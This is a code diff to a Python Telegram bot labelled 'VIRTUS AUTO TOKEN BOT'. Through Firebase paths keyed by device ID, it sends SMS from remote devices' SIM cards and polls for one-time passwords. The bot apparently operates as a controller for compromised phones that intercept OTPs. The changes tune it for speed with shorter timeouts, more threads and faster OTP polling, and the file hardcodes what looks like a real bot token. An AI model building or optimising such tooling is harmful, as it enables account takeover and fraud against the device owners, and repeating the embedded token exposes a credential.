@@ -30,11 +30,15 @@ from telegram.ext import (
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8901092528:AAFQ23IMYD5oVL1cNEquLphWc5RYij0FJZw")
 DATA_FILE = Path(os.getenv("USER_DATA_FILE", "user_data.json"))
 DEFAULT_BASE_URL = os.getenv("DEFAULT_BASE_URL", "")
-SMS_TIMEOUT = float(os.getenv("SMS_TIMEOUT", "2"))
-OTP_POLL_INTERVAL = float(os.getenv("OTP_POLL_INTERVAL", "0.3"))
-DEVICE_POLL_INTERVAL = float(os.getenv("DEVICE_POLL_INTERVAL", "1.0"))
-FIREBASE_TIMEOUT = float(os.getenv("FIREBASE_TIMEOUT", "3"))
-EXECUTOR = ThreadPoolExecutor(max_workers=20)
+SMS_TIMEOUT = float(os.getenv("SMS_TIMEOUT", "0.5"))
+OTP_POLL_INTERVAL = float(os.getenv("OTP_POLL_INTERVAL", "0.1"))
+DEVICE_POLL_INTERVAL = float(os.getenv("DEVICE_POLL_INTERVAL", "2.0"))
+FIREBASE_TIMEOUT = float(os.getenv("FIREBASE_TIMEOUT", "1"))
+EXECUTOR = ThreadPoolExecutor(max_workers=50)
+
+# HTTP session — connection reuse = faster SMS/Firebase
+_http = requests.Session()
+_http.headers.update({"Connection": "keep-alive"})
 
 # base_url cache: firebase_url+device_id -> url
 _base_url_cache: dict[str, str] = {}
@@ -229,7 +233,7 @@ def persist_config(user_id: int, cfg: UserConfig) -> None:
 
 
 def firebase_get(url: str, path: str) -> Any:
-    res = requests.get(f"{url.rstrip('/')}/{path.lstrip('/')}.json", timeout=FIREBASE_TIMEOUT)
+    res = _http.get(f"{url.rstrip('/')}/{path.lstrip('/')}.json", timeout=FIREBASE_TIMEOUT)
     res.raise_for_status()
     return res.json()
 
@@ -486,7 +490,7 @@ def send_sms(base_url: str, device_id: str, sim_index: int, to_number: str, mess
     url = f"{base_url.rstrip('/')}/clients/{device_id}/webhookEvent/sendSms.json"
     payload = {"from": sim_index, "to": to_number, "message": message, "isSended": False}
     try:
-        res = requests.patch(url, json=payload, timeout=SMS_TIMEOUT)
+        res = _http.patch(url, json=payload, timeout=SMS_TIMEOUT)
         return res.status_code == 200, res.status_code, ""
     except requests.RequestException as exc:
         return False, 0, str(exc)
@@ -519,7 +523,7 @@ def status_text(cfg: UserConfig) -> str:
         f"Device: {device_line}\n"
         f"Status: {online_line}\n"
         f"Number: {sim_line}\n"
-        f"Chat Name: {cfg.chat_name or '—'}\n"
+        f"Chat Name: {chat_label(cfg.chat_name) if cfg.chat_name else '—'}\n"
         f"Chat ID: {cfg.chat_id or '—'}\n"
         f"Step: {cfg.step}\n"
         f"Listening: {listening}\n"
@@ -576,7 +580,7 @@ async def cmd_change(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     cfg = get_config(update.effective_user.id, context)
     await update.message.reply_text(
         "👥 *Change Settings*\n\n"
-        f"📌 Current Chat ID: `{cfg.chat_id or '—'}`\n"
+        f"📌 Current Chat: *{chat_label(cfg.chat_name) if cfg.chat_name else '—'}*\n"
         f"🤖 Current Bot Token: `{mask_token(cfg.bot_token)}`\n\n"
         "Kya change karna hai?",
         parse_mode="Markdown",
@@ -1124,15 +1128,22 @@ async def process_outbound_sms(
     chat_name: str,
 ) -> None:
     loop = asyncio.get_running_loop()
-    ok, status_code, err = await loop.run_in_executor(
-        EXECUTOR,
-        send_sms,
-        base_url,
-        device_id,
-        sim_index,
-        to_number,
-        sms_body,
+
+    # SMS turant fire — 0.1 sec mode
+    send_task = loop.run_in_executor(
+        EXECUTOR, send_sms, base_url, device_id, sim_index, to_number, sms_body
     )
+    notify_task = bot.send_message(
+        chat_id=user_id,
+        text=f"⏳ Sending SMS to `{to_number}`...",
+        parse_mode="Markdown",
+    )
+
+    ok, status_code, err = await send_task
+    try:
+        await notify_task
+    except Exception:
+        pass
 
     if ok:
         status = "✅ SENT"
@@ -1147,7 +1158,6 @@ async def process_outbound_sms(
     await bot.send_message(
         chat_id=user_id,
         text=(
-            f"⏳ → `{to_number}`\n\n"
             "📬 *SMS Delivery Report*\n\n"
             f"*STATUS:* {status}\n"
             f"*To:* `{to_number}`\n"
@@ -1346,7 +1356,7 @@ async def poll_background(context: ContextTypes.DEFAULT_TYPE) -> None:
 
 def main() -> None:
     print("\n🚀 VIRTUS AUTO TOKEN BOT STARTING\n")
-    print(f"⚡ OTP poll: {OTP_POLL_INTERVAL}s | Device refresh: {DEVICE_POLL_INTERVAL}s\n")
+    print(f"⚡ FAST MODE: OTP {OTP_POLL_INTERVAL}s | SMS timeout {SMS_TIMEOUT}s | Firebase {FIREBASE_TIMEOUT}s\n")
 
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
